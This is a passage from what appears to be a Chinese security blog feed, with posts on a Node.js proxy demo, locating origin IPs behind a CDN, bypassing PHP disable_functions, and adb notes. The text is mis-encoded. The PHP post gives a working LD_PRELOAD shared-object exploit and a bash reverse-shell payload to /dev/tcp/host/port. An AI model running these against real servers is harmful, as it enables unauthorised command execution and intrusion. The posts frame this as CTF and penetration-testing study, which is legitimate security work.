ä»£ç†è·¯ç”±ï¼Œå°†è¯·æ±‚è½¬å‘åˆ°ç™¾åº¦</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.baidu.com&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line">        res.<span class="title function_">send</span>(data); <span class="comment">// å°†ä»ç™¾åº¦è·å–çš„æ•°æ®å‘é€å›å®¢æˆ·ç«¯</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error making proxy request:&#x27;</span>, error);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;An error occurred while making proxy request&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Proxy server is running on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å‰ç«¯ä»£ç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX Proxy Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">makeRequest</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// ä½¿ç”¨è‡ªå·±çš„ä»£ç†æœåŠ¡å™¨</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://localhost:3000/proxy&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// è¿™é‡Œå°†æ˜¾ç¤ºç™¾åº¦é¦–é¡µçš„HTML</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;response&#x27;</span>).<span class="property">innerHTML</span> = xhr.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Proxy request failed.&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>AJAX Proxy Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;makeRequest()&quot;</span>&gt;</span>Request Baidu through Proxy<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;response&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><p>ä¸å¤ªæ˜ç™½ä¸€äº›é¢è¯•æ€»æ˜¯ä¼šé—®çš„ç‰¹åˆ«ç»†ï¼Œæ¯”å¦‚ä¸€äº›CORSå­—æ®µä»€ä¹ˆçš„ï¼ŒCSPçš„ä¸€äº›å­—æ®µç­‰ç­‰ï¼Œæ„Ÿè§‰å¤ªå¤šå•¦ æœ‰æ—¶å€™ç¡®å®è®°ä¸ä½å•Šï¼Œçœ‹è§çŸ¥é“æ˜¯ä»€ä¹ˆæ„æ€è¿˜ä¸è¡Œå—ï¼Ÿæœ‰ç‚¹åºŸè„‘å­ï¼Œæœ‰æ—¶å€™çŸ¥é“å·²ç»ç†è§£å•¦ï¼Œä½†æ˜¯è¿˜æ˜¯è®°ä¸ä½é‚£äº›å‚æ•°ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ç»•è¿‡CDNæŸ¥æ‰¾çœŸå®ip</title>
    <url>//posts/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip/</url>
    <content><![CDATA[<h2 id="ç»•è¿‡CDNæŸ¥æ‰¾çœŸå®ip"><a href="#ç»•è¿‡CDNæŸ¥æ‰¾çœŸå®ip" class="headerlink" title="ç»•è¿‡CDNæŸ¥æ‰¾çœŸå®ip"></a>ç»•è¿‡CDNæŸ¥æ‰¾çœŸå®ip</h2><h4 id="å¦‚ä½•ç¡®å®šç½‘ç«™æ˜¯å¦å¼€å¯CDN"><a href="#å¦‚ä½•ç¡®å®šç½‘ç«™æ˜¯å¦å¼€å¯CDN" class="headerlink" title="å¦‚ä½•ç¡®å®šç½‘ç«™æ˜¯å¦å¼€å¯CDN"></a>å¦‚ä½•ç¡®å®šç½‘ç«™æ˜¯å¦å¼€å¯CDN</h4><p>1ã€å…¨å›½ä¹±pingï¼Œå¦‚æœipä¸å°½ç›¸åŒï¼Œè¯´æ˜å¼€å¯CDNåŠ é€Ÿï¼š<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
<span id="more"></span>

<p>2ã€ç›´æ¥æŸ¥ipï¼Œå¤§å‚å•†çš„CDNipå¯ç›´æ¥æŸ¥åˆ°ï¼š<br><img data-src="/images/pages/1587865705889.png" alt="1587865705889"></p>
<h4 id="äºŒçº§åŸŸåæ³•"><a href="#äºŒçº§åŸŸåæ³•" class="headerlink" title="äºŒçº§åŸŸåæ³•"></a>äºŒçº§åŸŸåæ³•</h4><p>å¾ˆå¤šå‚å•†çš„äºŒçº§åŸŸåä¸ä¼šä¹Ÿå¼€å¯CDNé˜²æŠ¤ï¼Œæ‰€ä»¥å¯èƒ½è¿™æ ·å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„çœŸå®ipï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤šä¸ªäººä¼šæŠŠè‡ªå·±çš„å­åŸŸåéƒ½æ”¾åˆ°CDNä¸Šï¼Œè€Œä¸”æœ‰æ—¶å€™ä¸åŒå­åŸŸåä¸ç”¨åŒä¸€ä¸ªipï¼Œæ‰€ä»¥æ­¤æ–¹æ³•ä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ã€‚</p>
<h4 id="nslookupæŸ¥æ‰¾çœŸå®IP"><a href="#nslookupæŸ¥æ‰¾çœŸå®IP" class="headerlink" title="nslookupæŸ¥æ‰¾çœŸå®IP"></a>nslookupæŸ¥æ‰¾çœŸå®IP</h4><p>å›½å†…å¾ˆå¤šCDNå‚å•†ä¸åœ¨å›½å¤–åšCDNï¼Œä¸šåŠ¡éœ€æ±‚ä¸é«˜å˜›ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å›½å¤–çš„ä¸€äº›DNSçœ‹çœ‹æœ‰æ²¡æœ‰ç»‘å®šçœŸå®IP</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nslookup http://xxx.com <span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="çœ‹DNSå†å²è®°å½•"><a href="#çœ‹DNSå†å²è®°å½•" class="headerlink" title="çœ‹DNSå†å²è®°å½•"></a>çœ‹DNSå†å²è®°å½•</h4><p>é€šè¿‡å†å²è§£æè¿‡çš„DNSè®°å½•æ¥æŸ¥æ‰¾åˆ°çœŸå®IPï¼Œä¸‡ä¸€æµ‹è¯•çš„æ—¶å€™æ²¡æœ‰ä¸ŠCDNï¼Œå¯èƒ½å°±è¢«çˆ¬è™«çˆ¬ä¸‹æ¥ï¼š</p>
<p><a href="https://securitytrails.com/domain/tituku.cn/dns">https://securitytrails.com/domain/tituku.cn/dns</a></p>
<h4 id="é€šè¿‡è¯ä¹¦æ‰¾åˆ°çœŸå®IP"><a href="#é€šè¿‡è¯ä¹¦æ‰¾åˆ°çœŸå®IP" class="headerlink" title="é€šè¿‡è¯ä¹¦æ‰¾åˆ°çœŸå®IP"></a>é€šè¿‡è¯ä¹¦æ‰¾åˆ°çœŸå®IP</h4><p>æœ‰äº›äººæ²¡æœ‰é’±æè¯ä¹¦ï¼Œåˆæƒ³ä¸ŠHTTPSï¼Œä»–å°±ä¼šæ‰¾ä¸€äº›å…è´¹çš„è¯ä¹¦ï¼Œè€Œè¿™äº›å…è´¹çš„è¯ä¹¦éƒ½æ˜¯ç»‘å®šåœ¨åŸŸåä¸Šçš„ï¼Œè€Œå¦‚æœè¿™æ—¶å€™æœ‰ä¸€ä¸ªå…¨ç½‘æ‰«æçš„ä¸œè¥¿æ‰«å…¨ç½‘çš„443ç«¯å£ï¼ŒæŸ¥çœ‹è¯ä¹¦çš„ä¿¡æ¯å°±å¯ä»¥ï¼ˆå› ä¸ºä½ çš„ç”³è¯·è¯ä¹¦å¿…é¡»è¦æœ‰åŸŸåï¼‰</p>
<p><a href="https://censys.io/">https://censys.io/</a>  </p>
<p>æˆ‘ä»¬ä¸éœ€è¦å»æ‰¾è¯ä¹¦ï¼Œä¸Šé¢è¿™ä¸ªç½‘ç«™ç›´æ¥å…¨ç½‘çˆ¬å–ç„¶åæ‰¾åˆ°è¯ä¹¦ä¸€è‡´çš„ç½‘ç«™ipå’ŒåŸŸåå¯¹åº”èµ·æ¥ï¼Œè¿™æ ·ä¸€ä¸ªä¸ªäººåšå®¢å³ä½¿ä»–ç»‘å®šä¹‹å‰å°±ç›´æ¥ä½¿ç”¨äº†CDNï¼Œä½†æ˜¯å¦‚æœä»–çš„è¯ä¹¦å¦‚æœè¢«æ¯”å¯¹åˆ°ä¹Ÿä¼šè¢«è¯†åˆ«åˆ°çœŸå®çš„IPã€‚</p>
]]></content>
      <categories>
        <category>ä¿¡æ¯æ”¶é›†</category>
      </categories>
      <tags>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>phpç»•è¿‡disableå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</title>
    <url>//posts/php%E7%BB%95%E8%BF%87disable%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><p>å‘½ä»¤æ‰§è¡Œä¸€èˆ¬éƒ½ç”¨phpè‡ªå¸¦çš„å‡½æ•°æ¥è¿›è¡Œæ‰§è¡Œ,ä½†æ˜¯å¾ˆå¤šæ—¶å€™è¿ç»´æˆ–è€…æå®‰å…¨çš„ä¼šç¦ç”¨è¿™äº›ç”¨ä¸åˆ°çš„å‡½æ•°æ¥åŠ å›º,åŒ…æ‹¬ä¸€äº›CTFä¹Ÿæ˜¯ç¦ç”¨ä¸€äº›å‡½æ•°æ¥è€ƒå¯Ÿä½ çš„ç»•è¿‡èƒ½åŠ›,è¿™æ—¶å€™å°±éœ€è¦ä½ å¯¹å¸¸è§çš„å‡½æ•°ç»•è¿‡è¿›è¡Œä¸€äº›äº†è§£,æœ¬æ–‡å°±æ˜¯æ€»ç»“ä¸‹phpåœ¨æ‰€æœ‰è‡ªå¸¦å‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«ç¦åçš„å…¶ä»–æ“ä½œ.</p>
<span id="more"></span>

<h2 id="å¸¸è§çš„è‡ªå¸¦ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å¸¸è§çš„è‡ªå¸¦ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å¸¸è§çš„è‡ªå¸¦ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å¸¸è§çš„è‡ªå¸¦ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">` ` <span class="comment">//åå¼•å·</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>






<h2 id="ä½¿ç”¨LD-PRELOAD-ç»•è¿‡"><a href="#ä½¿ç”¨LD-PRELOAD-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨LD_PRELOAD ç»•è¿‡"></a>ä½¿ç”¨LD_PRELOAD ç»•è¿‡</h2><h3 id="gnupgæ‰©å±•"><a href="#gnupgæ‰©å±•" class="headerlink" title="gnupgæ‰©å±•"></a>gnupgæ‰©å±•</h3><p>å¦‚æœçœ‹åˆ°phpinfoä¸­æœ‰gnupgè‹¦ç†¬ç«™,è¯´æ˜å¯ä»¥ä½¿ç”¨gpgåŠ å¯†,gnupgæ‹“å±•ä¸‹çš„gnupg_init() å‡½æ•° å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ bypass</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">j0k3r</span><span class="params">()</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;no cmd&#x27; &gt; /tmp/cmd.output&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°æŠŠä»¥ä¸Šä»£ç ç”Ÿæˆ exp.soï¼Œ <code>gcc --share -fPIC exp.c -o exp.so</code><br>ç„¶åä¸Šä¼ æ–‡ä»¶åˆ° &#x2F;tmp&#x2F;exp.so<br>é€šè¿‡phpä»£ç è¿›è¡Œåˆ©ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>putenv(<span class="string">&quot;cmd=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1&#x27;&quot;</span>);<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/exp.so&quot;</span>);<span class="title function_ invoke__">gnupg_init</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥åå¼¹shelläº†.</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“æœªå®Œå¾…ç»­â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>adbå·¥å…·çš„ä½¿ç”¨ç¬”è®°</title>
    <url>//posts/adb%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ç”±äºæ‰€åœ¨éƒ¨é—¨æ˜¯é‡‘èè¡Œä¸šçš„å®‰å…¨æœåŠ¡éƒ¨é—¨ï¼Œæ‰€ä»¥å¾ˆå¤šæ—¶å€™éƒ½è¦è¿›è¡Œé“¶è¡Œã€é‡‘èä¸šçš„æ¸—é€æµ‹è¯•ï¼Œå…¶ä¸­å¾ˆå¤šéƒ½æ˜¯å°ç¨‹åºã€appç­‰ç§»åŠ¨ç«¯åº”ç”¨ã€‚æ‰€ä»¥adbæ˜¯å¿…é¡»è¦æŒæ¡çš„ï¼Œæˆ‘ä»¥å‰ä¹Ÿä»æ¥æ²¡ç©å„¿è¿‡andriodï¼Œä½†æ˜¯è¿˜æ˜¯è¿«äºä¸šåŠ¡éœ€æ±‚ï¼Œè‡ªå·±å­¦äº†ä¸€æ®µæ—¶é—´ã€‚åæ¥æˆ‘æƒ³å¦‚æœå†™å‡ºæ¥å¯èƒ½æ›´æœ‰æ¡ç†äº›ï¼Œè‡ªå·±ä¹Ÿèƒ½å¤ä¹ ä¸€éã€‚æ‰€ä»¥å°±å†™äº†è¿™ç¯‡ã€‚<br>è¿™ç¯‡æ–‡ç« æ²¡å•¥æŠ€æœ¯éš¾ç‚¹ï¼Œç”šè‡³å®ƒåªæ˜¯æˆ‘çš„ä¸ªäººç¬”è®°ã€‚æˆ‘è®²è¿°ä¸‹æˆ‘åœ¨å·¥ä½œä¸­æ˜¯æ€ä¹ˆç”¨adbçš„ï¼Œåé¢å¦‚æœæœ‰æ—¶é—´æˆ‘ä¹Ÿä¼šå†™å†™frida,å½“ç„¶fridaå°±å¤æ‚çš„å¤šäº†ã€‚ä¸‹é¢è¿˜æ˜¯çœ‹çœ‹adbè¿™ä¸ªå·¥å…·å§ã€‚<span id="more"></span></p>
<h4 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>ADBæ˜¯ Android å¼€å‘&#x2F;æµ‹è¯•äººå‘˜ä¸å¯æ›¿ä»£çš„å¼ºå¤§å·¥å…·ï¼Œä¹Ÿæ˜¯ Android è®¾å¤‡ç©å®¶çš„ä¸€ä¸ªç©å…·ã€‚å¦‚æœä½ è§‚å¯Ÿä»”ç»†ï¼Œå¾ˆå¤šåˆ·æœºã€åˆ·ç³»ç»Ÿçš„è½¯ä»¶éƒ½æ˜¯ç”¨çš„adbæ¥è¿›è¡Œæ“ä½œçš„ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä»–ä»¬ç›´æ¥æ’ä¸ŠUSBå¹¶æ‰“å¼€USBè°ƒè¯•åŠŸèƒ½å°±èƒ½åˆ·æœºã€å®‰è£…ç­‰ç­‰ã€‚ä½†æ˜¯å¦‚æœæƒé™è¿‡é«˜ï¼Œåˆ·æœºè½¯ä»¶ä¹Ÿæ˜¯å¯ä»¥ç»™ä½ è£…ç‚¹ä¸å¯è§çš„åº”ç”¨çš„ã€‚æ‰€ä»¥è¿˜æ˜¯æ…é‡ç”¨åˆ·æœºè½¯ä»¶å§ï¼</p>
<h4 id="ç›´æ¥ä¸Šæ‰‹"><a href="#ç›´æ¥ä¸Šæ‰‹" class="headerlink" title="ç›´æ¥ä¸Šæ‰‹"></a>ç›´æ¥ä¸Šæ‰‹</h4><p>ä¸‹è½½ADBç›´æ¥å»å®˜ç½‘ä¸‹è½½ï¼š<a href="https://developer.android.com/studio/releases/platform-tools.html">https://developer.android.com/studio/releases/platform-tools.html</a><br>é€‰æ‹©åˆé€‚çš„ç³»ç»Ÿä¸‹è½½å°±è¡Œäº†ï¼Œç„¶åç¯å¢ƒå˜é‡æƒ³é…å°±é…ï¼Œæ— æ‰€è°“çš„ä¸œè¥¿ï¼Œåæ­£ä½ ä¹Ÿå¯ä»¥ç›´æ¥åˆ°ç›®å½•ä¸‹è¿è¡Œadbã€‚</p>
<p>adbæ”¯æŒä¸¤ç§è¿æ¥æ–¹å¼ï¼šUSB å’Œ wifiï¼ˆä¸å¸¸ç”¨ï¼‰<br>èƒ½ç”¨USBè¿˜æ˜¯ç”¨USBå§wifi æœ‰æ—¶å€™ä¼šå‡ºé—®é¢˜ æˆ‘ä»æ¥ä¸ç”¨ã€‚<br>ä¸‹é¢ç›´æ¥æ‰¾ä¸ªrootæ‰‹æœºï¼Œæˆ‘æ‰‹é‡Œçš„æ˜¯   é­…æ—s6 : andriod7.0 è¿˜æ˜¯å»ºè®®ç”¨çœŸæœºï¼Œæ¨¡æ‹Ÿå™¨æ€»æ˜¯å‡ºä¸€å †é—®é¢˜ã€‚æ²¡é’±ä¹°æµ‹è¯•æœºçš„å½“æˆ‘æ²¡è¯´ã€‚<br>è¿æ¥USBï¼ˆä¸€ç«¯æ‰‹æœºï¼Œä¸€ç«¯ç”µè„‘ï¼‰ æ‰“å¼€USBçš„è°ƒè¯•æ¨¡å¼ï¼ˆåœ¨è®¾ç½®é‡Œé¢ï¼Œä½†å…·ä½“ä½ç½®æ¯ä¸ªæ‰‹æœºä¸ä¸€æ ·ï¼‰ï¼Œç„¶åæ‰“å¼€adbæ‰€åœ¨ç›®å½•å‘½ä»¤è¡Œç›´æ¥è¿è¡Œadb shell (è¿™æ˜¯ä½ åªæ’ä¸€å°æ‰‹æœºçš„æƒ…å†µ)ã€‚<br>å¦‚æœä½ æ’äº†å¤šå°æ‰‹æœºä½ å¯ä»¥ï¼š</p>
<ul>
<li><p>adb devices  &#x2F;&#x2F;çœ‹ä¸‹éƒ½æ˜¯å“ªå‡ ä¸ªæ‰‹æœº å“ªå‡ ä¸ªç¼–å·</p>
</li>
<li><p>adb -s b21b8569 shell  &#x2F;&#x2F;æŒ‡å®šè®¾å¤‡å·è¿›å…¥shell</p>
</li>
<li><p>adb shell + å‘½ä»¤ &#x2F;&#x2F;è¿™æ ·å°±ä¸ç”¨æ¯æ¬¡è¿›å…¥äº¤äº’äº†ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
</li>
</ul>
<p>PSï¼šæœ‰æ—¶å€™ä¼šå‡ºç°æ‰¾ä¸åˆ°æ‰‹æœºçš„æƒ…å†µï¼Œè¿™æ—¶å€™å¦‚æœä½ å·²ç»å¼€å¯äº†USBè°ƒè¯•å¹¶ä¸”æ‰‹æœºä¹Ÿæ˜¯ROOTæƒé™ï¼Œé‚£ä¹ˆå°±æ˜¯adbçš„é…ç½®é—®é¢˜äº†ï¼Œç›´æ¥åœ¨C:\Users&lt;ç”¨æˆ·å&gt;.android\adb_usb.iniä¸­æ·»åŠ ä¸€è¡Œ:0x2a45<br>,ç„¶ååœ¨cmdä¸­æ‰§è¡Œ  adb kill-server    adb start-server    adb devices å°±å¯ä»¥çœ‹åˆ°è®¾å¤‡äº†ã€‚å…¶å®ƒæ“ä½œç³»ç»ŸåŒç†</p>
<p>ok ç°åœ¨ä½ å¯ä»¥whoamiçœ‹ä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯æ™®é€šæƒé™ï¼Œç›´æ¥suå°±æ˜¯rootäº†ã€‚å¦‚æœä½ éœ€è¦æŠŠæ–‡ä»¶copyå‡ºæ¥ï¼Œé¦–å…ˆä¸è¦ç›´æ¥copyï¼Œå…ˆæŠŠæ–‡ä»¶æ”¾åˆ° &#x2F;data&#x2F;local&#x2F;tmp ç›®å½•ä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸´æ—¶ç›®å½•ï¼Œæ˜¯æˆ‘çš„å¾ˆå¤šåŒäº‹éƒ½ç”¨æ¥å­˜æ–‡ä»¶çš„ç›®å½•ã€‚è®°ä½å®ƒï¼Œå—¯ã€‚ç„¶åï¼š</p>
<ul>
<li>chmod 777 æ–‡ä»¶å &#x2F;&#x2F;åŠ æƒé™ è¦ä¸ç„¶è„±ä¸ä¸‹æ¥ å³ä¾¿ä»–æ˜¯ä¸´æ—¶ç›®å½•ä¹Ÿæ˜¯è¦æƒé™çš„å•Šã€‚</li>
<li>adb pull   æ‰‹æœºè·¯å¾„ ç”µè„‘è·¯å¾„   &#x2F;&#x2F;æŠŠæ‰‹æœºè·¯å¾„çš„æ–‡ä»¶æ‹‰åˆ°ç”µè„‘è·¯å¾„ä¸‹  </li>
<li>adb push ç”µè„‘è·¯å¾„ æ‰‹æœºè·¯å¾„  &#x2F;&#x2F;å’Œä¸Šé¢ç›¸å   æ³¨æ„æ–œæ ä¸ç›¸åŒï¼ˆwindowså’Œlinuxï¼‰</li>
</ul>
<p>PSï¼šå¾ˆå¤šæ—¶å€™è¦è®¤è¯çœ‹æŠ¥é”™ï¼Œè€Œä¸æ˜¯ç›²ç›®å»ç™¾åº¦ã€‚è„±ä¸ä¸‹æ¥ä¼ ä¸ä¸Šå»å¾ˆå¤šéƒ½æ˜¯æƒé™é—®é¢˜ã€‚</p>
<p>ä¸€èˆ¬æˆ‘ä»¬ä¸éœ€è¦å¯åŠ¨åœæ­¢ADBæœåŠ¡ï¼Œé™¤éä½ æ‰‹æ¬ ï¼Œæˆ–è€…å°±æ˜¯è¦é‡å¯ï¼Œè¯·ï¼š</p>
<ul>
<li>adb kill-server</li>
<li>adb start-server</li>
</ul>
<p>æ¯æ¬¡è¿›å…¥å‘½ä»¤è¡Œéƒ½éœ€è¦su æ˜¯ä¸æ˜¯å¾ˆçƒ¦ï¼Ÿæ²¡äº‹æˆ‘ä»¬å¯ä»¥è§£å†³ï¼š</p>
<ul>
<li>adb root  &#x2F;&#x2F;ç›´æ¥root å¯åŠ¨adb ä»¥åadb shell ç›´æ¥å°±æ˜¯ rootæƒé™äº†</li>
</ul>
<p>æœ‰æ—¶å€™æˆ‘ä»¬çš„ç«¯å£å¯èƒ½æ­£åœ¨è¢«å ç”¨ï¼Œè¿™æ—¶å€™å°±éœ€è¦ä¿®æ”¹adbçš„ç«¯å£ï¼š</p>
<ul>
<li>adb -P <port> start-server   &#x2F;&#x2F;é»˜è®¤æ˜¯5037 ä¸€èˆ¬éƒ½ä¸ä¼šå ç”¨çš„</li>
</ul>
<p>æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹appçš„åŒ…æ˜¯å“ªä¸ªæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œhookï¼š</p>
<ul>
<li>adb shell pm list packages  &#x2F;&#x2F;åˆ—å‡ºå½“å‰æ‰€æœ‰è¿è¡Œä¸­çš„åŒ…</li>
</ul>
<p>å®‰è£…&#x2F;å¸è½½apkï¼š</p>
<ul>
<li>adb install 1.apk  &#x2F;&#x2F;æœ‰æ—¶å€™æ‰‹æœºä¼šå¼¹çª—ã€éœ€è¦ç‚¹ç¡®è®¤ã€‚</li>
<li>adb uninstall 1.apk</li>
</ul>
<p>å¥½ç©å„¿çš„ä¸€äº›æ“ä½œæ‰‹æœºçš„æŒ‡ä»¤ï¼š</p>
<ul>
